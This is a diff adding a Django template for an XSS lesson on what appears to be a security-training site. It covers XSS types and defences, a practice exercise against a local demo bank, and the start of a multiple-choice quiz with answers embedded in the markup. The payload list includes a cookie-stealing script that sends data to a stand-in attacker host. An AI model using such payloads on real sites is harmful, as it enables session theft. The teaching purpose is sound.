@@ -1,0 +1,1621 @@
+{% extends "myapp/sqlInjection.html" %}
+
+{% block path %}
+{% endblock path %}
+
+
+{% block index %}
+<ul style="padding-left: 15px;">
+    <li><a href="#intro" class="text-light text-decoration-none">Introduction</a></li>
+    <li><a href="#what" class="text-light text-decoration-none">What is XSS?</a></li>
+    <li><a href="#why" class="text-light text-decoration-none">Why It’s Dangerous</a></li>
+    <li><a href="#types" class="text-light text-decoration-none">Types of XSS</a></li>
+    <li><a href="#dom" class="text-light text-decoration-none">DOM-Based XSS</a></li>
+    <li><a href="#stored" class="text-light text-decoration-none">Stored (Persistent) XSS</a></li>
+    <li><a href="#reflected" class="text-light text-decoration-none">Reflected (Non-persistent) XSS</a></li>
+    <li><a href="#payloads" class="text-light text-decoration-none">Common Payloads & Examples</a></li>
+    <li><a href="#exploitation" class="text-light text-decoration-none">Exploitation Scenarios</a></li>
+    <li><a href="#impact" class="text-light text-decoration-none">Typical Impacts</a></li>
+    <li><a href="#testing" class="text-light text-decoration-none">Testing & Detection</a></li>
+    <li><a href="#tools" class="text-light text-decoration-none">Tools for Finding XSS</a></li>
+    <li><a href="#prevention" class="text-light text-decoration-none">Prevention & Mitigation</a></li>
+    <li><a href="#sanitizers" class="text-light text-decoration-none">Sanitizers & Libraries</a></li>
+    <li><a href="#csp" class="text-light text-decoration-none">Content Security Policy (CSP)</a></li>
+    <li><a href="#frameworks" class="text-light text-decoration-none">Framework-Specific Guidance</a></li>
+    <li><a href="#responsible" class="text-light text-decoration-none">Responsible Disclosure & Ethics</a></li>
+    <li><a href="#hardening" class="text-light text-decoration-none">Runtime Hardening & Monitoring</a></li>
+    <li><a href="#advanced" class="text-light text-decoration-none">Advanced Techniques & Mitigations</a></li>
+    <li><a href="#summary" class="text-light text-decoration-none">Summary</a></li>
+</ul>
+{% endblock index %}
+
+{% block notes %}
+<div class="container mb-5" style="line-height:1.8;">
+  <h1 id="intro" class="mb-3 text-center">Cross-Site Scripting (XSS)</h1>
+
+  <section id="what">
+    <h2>What is XSS?</h2>
+    <p>
+      Cross-Site Scripting (XSS) is a client-side code injection vulnerability that lets attackers run
+      malicious scripts (usually JavaScript) in other users' browsers by injecting untrusted input into a web page.
+    </p>
+  </section>
+
+  <section id="why">
+    <h2>Why It’s Dangerous</h2>
+    <ul>
+      <li><strong>Account takeover:</strong> Steal session cookies or tokens and impersonate users.</li>
+      <li><strong>Data theft:</strong> Exfiltrate private data shown in-browser or accessible via JavaScript.</li>
+      <li><strong>Phishing & UI redress:</strong> Present fake forms or overlays to harvest credentials.</li>
+      <li><strong>Malware delivery:</strong> Load remote scripts to infect clients.</li>
+      <li><strong>Privilege abuse:</strong> Perform actions on behalf of the victim (CSRF-like effects).</li>
+    </ul>
+  </section>
+
+  <section id="types">
+    <h2>Types of XSS</h2>
+    <ul>
+      <li><strong>Stored (Persistent):</strong> Payload saved on server (database, message board) and served to users.</li>
+      <li><strong>Reflected (Non-persistent):</strong> Payload reflected in server response (e.g., search results) and triggered by crafted links.</li>
+      <li><strong>DOM-Based:</strong> Client-side JavaScript writes unsafe data into the DOM; no server-side reflection required.</li>
+    </ul>
+  </section>
+
+  <section id="dom">
+    <h2>DOM-Based XSS</h2>
+    <p>
+      DOM XSS happens when client-side scripts take untrusted input (location.hash, document.location, cookies, etc.)
+      and insert it into the DOM using <code>innerHTML</code>, <code>document.write</code>, <code>eval</code>, etc.
+    </p>
+    <pre><code>// vulnerable example
+const name = location.hash.substring(1);
+document.getElementById('greet').innerHTML = 'Hello ' + name;</code></pre>
+    <p><strong>Fix:</strong> Use <code>textContent</code>, safe templating, or sanitize input before insertion.</p>
+  </section>
+
+  <section id="stored">
+    <h2>Stored (Persistent) XSS</h2>
+    <p>
+      Attackers store payloads in persistent storage. Every user viewing the infected page executes the payload.
+      Examples: comment sections, user profiles, forum posts.
+    </p>
+  </section>
+
+  <section id="reflected">
+    <h2>Reflected (Non-persistent) XSS</h2>
+    <p>
+      Payload is included in a URL or request and reflected in the response. Users must be tricked into visiting the crafted URL.
+    </p>
+  </section>
+
+  <section id="payloads">
+    <h2>Common Payloads & Examples</h2>
+    <ul>
+      <li><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+      <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
+      <li><code>&lt;svg/onload=alert('svg')&gt;</code></li>
+      <li>Stealing cookie (demo only): <code>&lt;script&gt;fetch('https://attacker/?c='+document.cookie)&lt;/script&gt;</code></li>
+    </ul>
+    <p><strong>Note:</strong> Never run attack code on production systems — only in safe, authorised test environments.</p>
+  </section>
+
+  <section id="exploitation">
+    <h2>Exploitation Scenarios</h2>
+    <ol>
+      <li>Session hijacking by reading cookies (unless HttpOnly).</li>
+      <li>Credential harvesting via fake login forms.</li>
+      <li>Action chains: perform transactions or change settings using user's privileges.</li>
+      <li>Pivot to exploit browser plugins or extensions.</li>
+    </ol>
+  </section>
+
+  <section id="impact">
+    <h2>Typical Impacts</h2>
+    <ul>
+      <li>Loss of confidentiality and integrity of user data.</li>
+      <li>Brand damage and loss of user trust.</li>
+      <li>Regulatory/legal consequences if user data is exposed.</li>
+    </ul>
+  </section>
+
+  <section id="testing">
+    <h2>Testing & Detection</h2>
+    <ul>
+      <li>Manual testing: inject payloads into inputs, URL parameters, headers, and observe responses or behavior.</li>
+      <li>DOM testing: manipulate <code>location</code>, <code>hash</code>, and other client-side sources.</li>
+      <li>Use browser devtools to inspect DOM changes and event handlers.</li>
+      <li>Automated scanning: Burp Suite, OWASP ZAP, DOM Invader (Burp extension).</li>
+    </ul>
+  </section>
+
+  <section id="tools">
+    <h2>Tools for Finding XSS</h2>
+    <ul>
+      <li>Burp Suite (Intruder, Scanner, DOM tools)</li>
+      <li>OWASP ZAP</li>
+      <li>DOMInvader / DOM XSS scanners</li>
+      <li>Retire.js (to find vulnerable libs that could enable XSS)</li>
+    </ul>
+  </section>
+
+  <section id="prevention">
+    <h2>Prevention & Mitigation</h2>
+    <ul>
+      <li><strong>Output Encoding/Escaping:</strong> Escape data for its context — HTML body, attribute, JS, CSS, URL.</li>
+      <li><strong>Use Safe APIs:</strong> Prefer <code>textContent</code>, <code>setAttribute</code>, templating engines that auto-escape.</li>
+      <li><strong>Sanitize HTML:</strong> If you must accept HTML, sanitize with a robust library (whitelist-based).</li>
+      <li><strong>HttpOnly Cookies:</strong> Prevent JavaScript access to session cookies.</li>
+      <li><strong>SameSite & Secure Flags:</strong> Harden cookies to reduce CSRF + theft risk.</li>
+      <li><strong>Content Security Policy (CSP):</strong> Restrict script sources and disallow inline scripts where possible.</li>
+      <li><strong>Input Validation:</strong> Validate and normalize inputs, though validation alone is not sufficient.</li>
+      <li><strong>Avoid dangerous functions:</strong> Don’t use <code>eval()</code>, <code>new Function()</code>, <code>document.write()</code>, or <code>innerHTML</code> with untrusted data.</li>
+    </ul>
+  </section>
+
+  <section id="sanitizers">
+    <h2>Sanitizers & Libraries</h2>
+    <ul>
+      <li><strong>JavaScript:</strong> DOMPurify — robust, actively maintained sanitizer.</li>
+      <li><strong>Python:</strong> Bleach for sanitizing HTML inputs.</li>
+      <li><strong>Ruby:</strong> Rails auto-escapes; use strong parameters and helpers.</li>
+      <li><strong>Framework tips:</strong> Use built-in escaping in template engines (Django, Jinja, React JSX auto-escapes expressions).</li>
+    </ul>
+  </section>
+
+  <section id="csp">
+    <h2>Content Security Policy (CSP)</h2>
+    <p>
+      CSP reduces XSS impact by restricting sources for scripts, styles, frames, and more.
+      Example header (start strict, relax as needed):
+    </p>
+    <pre><code>Content-Security-Policy: default-src 'self'; script-src 'self' https://apis.example.com; object-src 'none';</code></pre>
+    <p><strong>Important:</strong> CSP is a mitigation, not a replacement for proper escaping/sanitization. Avoid <code>unsafe-inline</code> and nonces only if you can manage them securely.</p>
+  </section>
+
+  <section id="frameworks">
+    <h2>Framework-Specific Guidance</h2>
+    <ul>
+      <li><strong>Django:</strong> Templates auto-escape; use <code>|safe</code> only for trusted content. Use <code>bleach</code> to sanitize user HTML.</li>
+      <li><strong>React:</strong> JSX auto-escapes. Avoid <code>dangerouslySetInnerHTML</code> unless content is sanitized.</li>
+      <li><strong>Angular/Vue:</strong> Use the framework's templating and sanitizer utilities. Avoid bypassing built-in protections.</li>
+    </ul>
+  </section>
+
+  <section id="responsible">
+    <h2>Responsible Disclosure & Ethics</h2>
+    <p>
+      Only test XSS on systems you own or where you have explicit permission. If you discover a vulnerability:
+    </p>
+    <ol>
+      <li>Document steps to reproduce (P.O.C.) and potential impact.</li>
+      <li>Contact the owner/maintainer via a responsible disclosure channel or security contact.</li>
+      <li>Provide remediation advice and allow reasonable time for fixes before public disclosure.</li>
+    </ol>
+  </section>
+
+  <section id="hardening">
+    <h2>Runtime Hardening & Monitoring</h2>
+    <ul>
+      <li>WAF rules for common XSS patterns (as an extra layer).</li>
+      <li>RASP to detect suspicious DOM manipulations or script injection at runtime.</li>
+      <li>Logging of unusual user-supplied HTML or long/complex payloads.</li>
+      <li>Alerting on spikes in client-side errors or abnormal outbound requests from clients.</li>
+    </ul>
+  </section>
+
+  <section id="advanced">
+    <h2>Advanced Techniques & Mitigations</h2>
+    <p>
+      Consider Content Security Policy report-only mode to discover issues, use nonces for inline scripts
+      where necessary, apply strict transport security, and adopt secure development lifecycle checks
+      (SAST/DAST) in CI/CD.
+    </p>
+  </section>
+
+  <section id="summary">
+    <h2>Summary</h2>
+    <p>
+      XSS is a serious, common client-side vulnerability. Prevent it with context-aware escaping, safe DOM APIs,
+      sanitization for allowed HTML, HttpOnly cookies, CSP, and secure framework usage. Test responsibly and improve
+      defenses iteratively.
+    </p>
+
+    <blockquote class="blockquote p-3 bg-secondary text-light rounded">
+      <p class="mb-0"><strong>Ethical reminder:</strong> Always have explicit permission before testing. Responsible disclosure protects users and builds trust.</p>
+    </blockquote>
+  </section>
+</div>
+{% endblock notes %}
+
+{% block ethical %}
+<p class="mt-5 d-flex">
+                            <img src="/static/myapp/images/sql Open Peeps - Bust.png" alt="">Hello
+                            {{user.username}}, we had recieved a security scan request from
+                            VulnBank and after proper investigation we found XSS
+                            vulnerabilities in their website.
+                            <br><br>Their website's login page address is "https://127.0.0.1/vuln_bank_demo/login.php"
+                            <br>Want to look at it? 
+                            <br><br>Copy paste the address into a browser and try different types of xss injection
+                            patterns.
+                            <br><br>Oh, and don't hesitate, we got the full permission to test and web pentration from
+                            the owner of VlunBank.
+
+                            Do not try hacking attempts, unauthorized access on any website, until you got full
+                            permission. It's illegal and you got yourself in jail
+                            and get a slip of huge fine.
+
+                            <br><br>Enough of lecturing , please carry on!
+
+                            
+
+                        </p>
+                        <br><br>For example try to submit feedback like-
+                        <code style="color: red; background-color: transparent;">alert('THIS BANK IS BAD');</code>
+                        <br>then see what happens each time the page reloads.
+                        <br>
+                        <br>
+                        <p style="color: chartreuse;font-weight: bold;">Morale of the stroy: Always ensure input filterization if you are a developer.</p>
+
+{% endblock ethical %}
+
+{% block mcq %}
+<div id="mcq-container" class="p-3">
+    <h1 class="h3 mb-3">Cross-Site Scripting (XSS) — 50 MCQs</h1>
+    <p class="text-light mb-4">Select the best answer for each question and click <strong>Check Answers</strong>.</p>
+
+    <!-- QUESTION 1 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <div class="d-flex justify-content-between">
+                <h5 class="card-title mb-2">1. What is Cross-Site Scripting (XSS)?</h5>
+            </div>
+            <p class="card-text">Choose the best definition.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q1" id="q1a" value="a">
+                    <label class="form-check-label" for="q1a">A server-side SQL vulnerability.</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q1" id="q1b" value="b">
+                    <label class="form-check-label" for="q1b">A client-side injection that runs malicious scripts in users' browsers.</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q1" id="q1c" value="c">
+                    <label class="form-check-label" for="q1c">A form of CSRF protection.</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q1" id="q1d" value="d">
+                    <label class="form-check-label" for="q1d">A method to compress JavaScript.</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 2 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">2. Which of the following is a type of XSS?</h5>
+            <p class="card-text">Pick the correct type.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q2" id="q2a" value="a">
+                    <label class="form-check-label" for="q2a">Stored (Persistent) XSS</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q2" id="q2b" value="b">
+                    <label class="form-check-label" for="q2b">SQL-Based XSS</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q2" id="q2c" value="c">
+                    <label class="form-check-label" for="q2c">Network XSS</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q2" id="q2d" value="d">
+                    <label class="form-check-label" for="q2d">TLS XSS</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 3 -->
+    <div class="card mcq-card mb-2" data-correct="c">
+        <div class="card-body">
+            <h5 class="card-title mb-2">3. What causes DOM-based XSS?</h5>
+            <p class="card-text">Best answer.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q3" id="q3a" value="a">
+                    <label class="form-check-label" for="q3a">Server-side template rendering only</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q3" id="q3b" value="b">
+                    <label class="form-check-label" for="q3b">Broken authentication</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q3" id="q3c" value="c">
+                    <label class="form-check-label" for="q3c">Unsafe client-side JavaScript manipulating the DOM with untrusted data</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q3" id="q3d" value="d">
+                    <label class="form-check-label" for="q3d">A firewall misconfiguration</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 4 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">4. Which HTML API is safer for inserting plain text into the DOM?</h5>
+            <p class="card-text">Choose the safer API.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q4" id="q4a" value="a">
+                    <label class="form-check-label" for="q4a">innerHTML</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q4" id="q4b" value="b">
+                    <label class="form-check-label" for="q4b">textContent</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q4" id="q4c" value="c">
+                    <label class="form-check-label" for="q4c">document.write()</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q4" id="q4d" value="d">
+                    <label class="form-check-label" for="q4d">eval()</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 5 -->
+    <div class="card mcq-card mb-2" data-correct="d">
+        <div class="card-body">
+            <h5 class="card-title mb-2">5. Which payload is a simple XSS proof-of-concept?</h5>
+            <p class="card-text">Pick the common POC.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q5" id="q5a" value="a">
+                    <label class="form-check-label" for="q5a">&lt;div&gt;XSS&lt;/div&gt;</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q5" id="q5b" value="b">
+                    <label class="form-check-label" for="q5b">&lt;a&gt;XSS&lt;/a&gt;</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q5" id="q5c" value="c">
+                    <label class="form-check-label" for="q5c">&lt;style&gt;alert(1)&lt;/style&gt;</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q5" id="q5d" value="d">
+                    <label class="form-check-label" for="q5d">&lt;script&gt;alert(1)&lt;/script&gt;</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 6 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">6. Stored XSS is dangerous because:</h5>
+            <p class="card-text">Select best reason.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q6" id="q6a" value="a">
+                    <label class="form-check-label" for="q6a">Payload is served to many users from persistent storage</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q6" id="q6b" value="b">
+                    <label class="form-check-label" for="q6b">It only affects the attacker</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q6" id="q6c" value="c">
+                    <label class="form-check-label" for="q6c">It is impossible to detect</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q6" id="q6d" value="d">
+                    <label class="form-check-label" for="q6d">It only happens on mobile browsers</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 7 -->
+    <div class="card mcq-card mb-2" data-correct="c">
+        <div class="card-body">
+            <h5 class="card-title mb-2">7. Which cookie flag helps prevent JavaScript from reading cookies?</h5>
+            <p class="card-text">Choose the correct cookie flag.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q7" id="q7a" value="a">
+                    <label class="form-check-label" for="q7a">Secure</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q7" id="q7b" value="b">
+                    <label class="form-check-label" for="q7b">SameSite</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q7" id="q7c" value="c">
+                    <label class="form-check-label" for="q7c">HttpOnly</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q7" id="q7d" value="d">
+                    <label class="form-check-label" for="q7d">Domain</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 8 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">8. Which of the following mitigations helps against XSS by disallowing inline scripts?</h5>
+            <p class="card-text">Select the mitigation.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q8" id="q8a" value="a">
+                    <label class="form-check-label" for="q8a">HttpOnly cookies</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q8" id="q8b" value="b">
+                    <label class="form-check-label" for="q8b">Content Security Policy (CSP) without 'unsafe-inline'</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q8" id="q8c" value="c">
+                    <label class="form-check-label" for="q8c">SameSite cookie flag</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q8" id="q8d" value="d">
+                    <label class="form-check-label" for="q8d">TLS encryption</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 9 -->
+    <div class="card mcq-card mb-2" data-correct="d">
+        <div class="card-body">
+            <h5 class="card-title mb-2">9. Which library is a recommended HTML sanitizer for JavaScript?</h5>
+            <p class="card-text">Pick the correct library.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q9" id="q9a" value="a">
+                    <label class="form-check-label" for="q9a">jQuery UI</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q9" id="q9b" value="b">
+                    <label class="form-check-label" for="q9b">Lodash</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q9" id="q9c" value="c">
+                    <label class="form-check-label" for="q9c">Moment.js</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q9" id="q9d" value="d">
+                    <label class="form-check-label" for="q9d">DOMPurify</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 10 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">10. Which practice is recommended instead of using innerHTML with user input?</h5>
+            <p class="card-text">Choose the safest practice.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q10" id="q10a" value="a">
+                    <label class="form-check-label" for="q10a">Use textContent or setAttribute after proper validation</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q10" id="q10b" value="b">
+                    <label class="form-check-label" for="q10b">Use eval() to parse strings</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q10" id="q10c" value="c">
+                    <label class="form-check-label" for="q10c">Store HTML in cookies</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q10" id="q10d" value="d">
+                    <label class="form-check-label" for="q10d">Disable JavaScript entirely</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 11 -->
+    <div class="card mcq-card mb-2" data-correct="c">
+        <div class="card-body">
+            <h5 class="card-title mb-2">11. What does the 'unsafe-inline' directive in CSP do?</h5>
+            <p class="card-text">Pick the correct description.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q11" id="q11a" value="a">
+                    <label class="form-check-label" for="q11a">Blocks all external scripts</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q11" id="q11b" value="b">
+                    <label class="form-check-label" for="q11b">Enables only hashed scripts</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q11" id="q11c" value="c">
+                    <label class="form-check-label" for="q11c">Allows inline scripts and event handlers (weaker CSP)</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q11" id="q11d" value="d">
+                    <label class="form-check-label" for="q11d">Forbids all scripts</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 12 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">12. Which header helps you implement CSP?</h5>
+            <p class="card-text">Select the correct header name.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q12" id="q12a" value="a">
+                    <label class="form-check-label" for="q12a">X-Frame-Options</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q12" id="q12b" value="b">
+                    <label class="form-check-label" for="q12b">Content-Security-Policy</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q12" id="q12c" value="c">
+                    <label class="form-check-label" for="q12c">Strict-Transport-Security</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q12" id="q12d" value="d">
+                    <label class="form-check-label" for="q12d">Referrer-Policy</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 13 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">13. Which property should be set to true to secure cookies in transit?</h5>
+            <p class="card-text">Choose the correct cookie attribute.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q13" id="q13a" value="a">
+                    <label class="form-check-label" for="q13a">Secure</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q13" id="q13b" value="b">
+                    <label class="form-check-label" for="q13b">Domain</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q13" id="q13c" value="c">
+                    <label class="form-check-label" for="q13c">Path</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q13" id="q13d" value="d">
+                    <label class="form-check-label" for="q13d">Expires</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 14 -->
+    <div class="card mcq-card mb-2" data-correct="d">
+        <div class="card-body">
+            <h5 class="card-title mb-2">14. Which function is dangerous when used with untrusted input?</h5>
+            <p class="card-text">Pick the risky function.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q14" id="q14a" value="a">
+                    <label class="form-check-label" for="q14a">querySelector</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q14" id="q14b" value="b">
+                    <label class="form-check-label" for="q14b">getElementById</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q14" id="q14c" value="c">
+                    <label class="form-check-label" for="q14c">createElement</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q14" id="q14d" value="d">
+                    <label class="form-check-label" for="q14d">eval</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 15 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">15. Which DOM source is commonly exploited in DOM XSS?</h5>
+            <p class="card-text">Select the common source.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q15" id="q15a" value="a">
+                    <label class="form-check-label" for="q15a">CSS files</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q15" id="q15b" value="b">
+                    <label class="form-check-label" for="q15b">location.hash or location.search</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q15" id="q15c" value="c">
+                    <label class="form-check-label" for="q15c">HTTP status codes</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q15" id="q15d" value="d">
+                    <label class="form-check-label" for="q15d">SVG metadata only</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 16 -->
+    <div class="card mcq-card mb-2" data-correct="a">
+        <div class="card-body">
+            <h5 class="card-title mb-2">16. Which framework feature typically auto-escapes variables in templates?</h5>
+            <p class="card-text">Pick the correct framework behavior.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q16" id="q16a" value="a">
+                    <label class="form-check-label" for="q16a">Template auto-escaping</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q16" id="q16b" value="b">
+                    <label class="form-check-label" for="q16b">Automatic eval()</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q16" id="q16c" value="c">
+                    <label class="form-check-label" for="q16c">Default innerHTML insertion</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q16" id="q16d" value="d">
+                    <label class="form-check-label" for="q16d">Auto-document.write()</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 17 -->
+    <div class="card mcq-card mb-2" data-correct="d">
+        <div class="card-body">
+            <h5 class="card-title mb-2">17. What is a good approach when allowing rich HTML from users?</h5>
+            <p class="card-text">Select the safest approach.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q17" id="q17a" value="a">
+                    <label class="form-check-label" for="q17a">Allow raw HTML without checks</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q17" id="q17b" value="b">
+                    <label class="form-check-label" for="q17b">Store HTML in client cookies</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q17" id="q17c" value="c">
+                    <label class="form-check-label" for="q17c">Use innerHTML directly</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q17" id="q17d" value="d">
+                    <label class="form-check-label" for="q17d">Sanitize HTML with a whitelist-based sanitizer</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 18 -->
+    <div class="card mcq-card mb-2" data-correct="b">
+        <div class="card-body">
+            <h5 class="card-title mb-2">18. Which of these is NOT an XSS impact?</h5>
+            <p class="card-text">Choose the incorrect impact.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q18" id="q18a" value="a">
+                    <label class="form-check-label" for="q18a">Session hijacking</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q18" id="q18b" value="b">
+                    <label class="form-check-label" for="q18b">Direct SQL server memory overwrite from browser (false)</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q18" id="q18c" value="c">
+                    <label class="form-check-label" for="q18c">Phishing via fake UI</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q18" id="q18d" value="d">
+                    <label class="form-check-label" for="q18d">Unauthorized actions on behalf of user</label>
+                </div>
+            </div>
+            <div class="mt-2 feedback small"></div>
+        </div>
+    </div>
+
+    <!-- QUESTION 19 -->
+    <div class="card mcq-card mb-2" data-correct="c">
+        <div class="card-body">
+            <h5 class="card-title mb-2">19. Which testing tool is commonly used for manual XSS testing?</h5>
+            <p class="card-text">Select the manual testing tool.</p>
+            <div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q19" id="q19a" value="a">
+                    <label class="form-check-label" for="q19a">Nmap</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q19" id="q19b" value="b">
+                    <label class="form-check-label" for="q19b">Wireshark</label>
+                </div>
+                <div class="form-check">
+                    <input class="form-check-input" type="radio" name="q19" id="q19c" value="c">
+                    <label class="form-check-label" for="q19c">Burp Suite</label>
+                </div>
+                <div class="form-check">
